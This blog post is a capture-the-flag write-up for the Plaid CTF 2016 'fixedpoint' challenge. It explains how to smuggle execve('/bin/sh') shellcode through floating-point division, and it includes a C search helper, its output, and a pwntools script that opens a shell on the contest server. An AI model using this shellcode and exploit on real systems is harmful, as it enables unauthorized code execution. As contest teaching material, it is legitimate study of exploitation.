---
layout: post
title: "Plaid CTF 2016 - fixedpoint"
date: 2016-04-18 21:00
---

*Here is another solution to a pwn challenge. They are no vulnerability per say, but a rather interesting way of getting code execution through floating point arithmetics.*

<!--more-->

### Description

*IEEE754 is useful when your values go from -inf to +inf, but really, fixed point is all you need. But if you want, you could grab this too. Running at fixedpoint.pwning.xxx:7777*

### Details

Points:     175

Catergory:  Pwnable

Validation: 56

### Solution

We have an unstripped ELF 32-bit executable with NX enabled and its corresponding source code.

```bash
$ file fixedpoint
fixedpoint: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24,
BuildID[sha1]=b3d0a38eefc86d419e757583139c8a00ca4433bf, not stripped

$ checksec --file fixedpoint
RELRO           STACK CANARY      NX            PIE             RPATH
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH
RUNPATH      FILE
No RUNPATH   fixedpoint
```

# Source code

The sourc code was also provided:

```c
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

int main(int argc, char** argv) {
  float* array = mmap(0, sizeof(float)*8192, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  int i;
  int temp;
  float ftemp;

  for (i = 0; i < 8192; i++) {
    if (!scanf("%d", &temp)) break;
    array[i] = ((float)temp)/1337.0;
  }

  write(1, "here we go\n", 11);
  (*(void(*)())array)();
}
```

As we can see the code is quite simple:

* it allocates an `array` for 8192 floats (4 bytes each)
* reads from stdin a number
* divide it by 1337 and store it in the array
* once 8192 values have been read or scanf was not able to extract a value, it tries to execute what is contained in `array`

If we can insert correct opcodes into the array, we would be able to execute arbitrary instructions. The problem is that with floats and the division by 1337 they are some value that we can't produce.

# Opcodes of interest

As usual, the shellcode we want to execute is a syscall to `execve("/bin/sh\0", 0, 0)`. On Linux 32-bit, a syscall uses the fastcall calling method where arguments are passed by registers rather than on the stack:

* eax: 11 (syscall number)
* ebx: address of `/bin/sh\0`
* ecx: 0
* edx: 0

Usually I would use the instruction `mov` to set eax but its corresponding opcode takes too much bytes and it is not possible to produce it. I'd rather use a `xor` followed by 11 `inc`:

```
$ shellnoob --intel -i --to-opcode
asm_to_opcode selected (type "quit" or ^C to end)
>> mov eax, 11
mov eax, 11 ~> b80b000000
>> xor eax, eax
xor eax, eax ~> 31c0
>> inc eax
inc eax ~> 40
>> xor ecx, ecx
xor ecx, ecx ~> 31c9
>> xor edx, edx
xor edx, edx ~> 31d2
>> int 0x80
int 0x80 ~> cd80
```

For `ecx` and `edx` we can also use `xor`. Now there is the problem of finding a place for `/bin/sh\0` and small opcodes to reference it into `ebx`.


I chose to copy the value of the stack pointer into `ebx` then for each bytes of the string:

* copy the byte at the location pointed by `ebx`
* increment `ebx`

Once done, I have to rewind `ebx` at the beginning of the string. Another way could have been to use the `push` instruction to push the bytes on the stack in the reverse order and then copy the value of stack pointer into `ebx`.

Here are the remaining opcodes:

```
$ shellnoob --intel -i --to-opcode
asm_to_opcode selected (type "quit" or ^C to end)
>> mov ebx, esp
mov ebx, esp ~> 89e3
>> dec ebx
dec ebx ~> 4b
```

It is rather impossible to join all the needed opcode one after the other. We therefore need to surround them with dummy instruction such as `nop` or any other instructions that are 1 byte long. Through test of producible value, I found that a lot have 0x46 or 0x47 as the most significant byte, which correspond to `inc esi` and `inc edi` respectively.

I wrote a quick and dirty helper to find values that have the needed instruction in it and are surrounded by dummy ones:

```c
/* compile with:
 * gcc -m32 -o gen_numbers -Wall -O2 gen_numbers.c
 * -m32 is needed because the target binary is also 32-bit and float numbers
 *  are not the same between a 32-bit binary and a 64-bit one
 */

#include <stdlib.h>
#include <stdio.h>

int main(void) {

  unsigned int i;
  unsigned int o;
  float v;
  float *pf;
  int *pi;
  int temp;
  int got;

  char *instructions[] = {
    "xor eax, eax; inc eax ~> 31c040",
    "inc eax; inc eax ~> 4040",
    "inc ebx; ~> 43",
    "dec ebx; dec ebx ~> 4b4b",
    "xor ecx, ecx ~> 31c9",
    "xor edx, edx ~> 31d2",
    "int 0x80 ~> cd80",
    "mov ebx, esp ~> 89e3",
    "dec ebx, dec ebx ~> 4b4b",
    "mov byte ptr [ebx], 0x2f ~> c6032f /",
    "mov byte ptr [ebx], 0x62 ~> c60362 b",
    "mov byte ptr [ebx], 0x69 ~> c60369 i",
    "mov byte ptr [ebx], 0x6e ~> c6036e n",
    "mov byte ptr [ebx], 0x73 ~> c60373 s",
    "mov byte ptr [ebx], 0x68 ~> c60368 h",
    "mov byte ptr [ebx], 0x00 ~> c60300 \\0"
  };
  int opcodes[] = {
    0x40c031,
    0x4040,
    /* add a dummy 46 */
    0x4643,
    0x4b4b,
    0xc931,
    0xd231,
    0x80cd,
    0xe389,
    0x4b4b, 
    0x2f03c6,
    0x6203c6,
    0x6903c6, 
    0x6e03c6,
    0x7303c6,
    0x6803c6,
    /* need to cheat for the test */
    0x10003c6
  };
  size_t size = sizeof(opcodes) / sizeof(opcodes[0]);

  /* dark pointer magic
   * the idea is to have a look at the float value from an integer prespective
   * to have an easy way to manipulate and compare it.
   */
  pf = &v;
  pi = (int *)pf;

  got = 0;
  for (i = 0; (got < size) && (i < 0xffffffff); i++) {
    temp = i;
    v = ((float)temp) / 1337.0;
    for ( o = 0; o < size; o++ ) {
      if ( opcodes[o] ) {
        /* separate both cases for a little more clarity... */
        if ( opcodes[o] < 0x10000 ) {
          /*
           * most significant byte is  either 0x46 or 0x47
           * case 1: next is either 0x46, 0x47 or 0x90
           *         two lowest significant byte are the opcode
           * case 2: next is the opcode
           *         least significant byte is either 0x46, 0x47 or 0x90
           */
          if ( (((*pi >> 24) == 0x46) || ((*pi >> 24) == 0x47))
              /* case 1 */
              && (((((*pi >> 16 & 0xff) == 0x46) || ((*pi >> 16 & 0xff) == 0x47)
                  || ((*pi >> 16 & 0xff) == 0x90)) && ((*pi & 0xffff) == opcodes[o]))
              /* case 2 */
                || ((((*pi & 0xff) == 0x46) || ((*pi & 0xff) == 0x47)
                    || ((*pi & 0xff) == 0x90)) && ((*pi & 0xffff00) == opcodes[o]))) ) {
            printf("%d => 0x%08x : %s\n", temp, *pi, instructions[o]);
            opcodes[o] = 0;
            got++;
          }
        } else {
          /* because of the cheat we have to mask it */
          if ( ((*pi) == ((opcodes[o] & 0xffffff) | 0x47000000))
              || ((*pi) == ((opcodes[o] & 0xffffff) | 0x46000000)) ) {
            printf("%d => 0x%08x : %s\n", temp, *pi, instructions[o]);
            opcodes[o] = 0;
            got++;
          }
        }
      }
    }
  }
  exit(0);
}
```

Here is its output:

```bash
$ ./gen_numbers
10953965 => 0x460003c6 : mov byte ptr [ebx], 0x00 ~> c60300 \0
14975661 => 0x462f03c6 : mov byte ptr [ebx], 0x2f ~> c6032f /
16493296 => 0x4640c031 : xor eax, eax; inc eax ~> 31c040
16963939 => 0x46464040 : inc eax; inc eax ~> 4040
16965949 => 0x46464643 : inc ebx; ~> 43
16967631 => 0x46464b4b : dec ebx; dec ebx ~> 4b4b
16967631 => 0x46464b4b : dec ebx, dec ebx ~> 4b4b
16985516 => 0x464680cd : int 0x80 ~> cd80
17009712 => 0x4646c931 : xor ecx, ecx ~> 31c9
17012720 => 0x4646d231 : xor edx, edx ~> 31d2
17018517 => 0x4646e389 : mov ebx, esp ~> 89e3
19339629 => 0x466203c6 : mov byte ptr [ebx], 0x62 ~> c60362 b
19853037 => 0x466803c6 : mov byte ptr [ebx], 0x68 ~> c60368 h
19938605 => 0x466903c6 : mov byte ptr [ebx], 0x69 ~> c60369 i
```

# Payload

Now the numbers in the first column can be used to create the payload:

```python
#!/usr/bin/env python2

from pwn import *

r = remote('fixedpoint.pwning.xxx', 7777)
#r = remote('localhost', 7777)

payload = [
        '17018517', # mov ebx, esp ~> 89e3
        '16493296', # xor eax, eax; inc eax ~> 31c040
        '16963939', # inc eax; inc eax ~> 4040
        '16963939', # inc eax; inc eax ~> 4040
        '16963939', # inc eax; inc eax ~> 4040
        '16963939', # inc eax; inc eax ~> 4040
        '16963939', # inc eax; inc eax ~> 4040
        '17009712', # xor ecx, ecx ~> 31c9
        '17012720', # xor edx, edx ~> 31d2
        '14975661', # /
        '16965949', # inc ebx
        '19339629', # b
        '16965949', # inc ebx
        '19938605', # i
        '16965949', # inc ebx
        '20366445', # n
        '16965949', # inc ebx
        '14975661', # /
        '16965949', # inc ebx
        '20794285', # s
        '16965949', # inc ebx
        '19853037', # h
        '16965949', # inc ebx
        '10953965', # \0
        '16965949', # inc ebx
        '16967631', # dec ebx; dec ebx;
        '16967631', # dec ebx; dec ebx;
        '16967631', # dec ebx; dec ebx;
        '16967631', # dec ebx; dec ebx;
        '17071084', # int 0x80
        ]

for d in payload:
    r.sendline(d)
# make scanf return 0
r.sendline('pretty please')
r.interactive()
```

Once executed, we have our shell:

```bash
$ ./payload.py
[+] Opening connection to fixedpoint.pwning.xxx on port 7777: Done
[*] Switching to interactive mode
here we go
$ ls
fixedpoint_02dc03c8a5ae299cf64c63ebab78fec7
flag.txt
wrapper
$ cat flag.txt
PCTF{why_isnt_IEEE_754_IEEE_7.54e2}
```

Maybe I should have spent hours reading the specs of IEEE 754 ;)

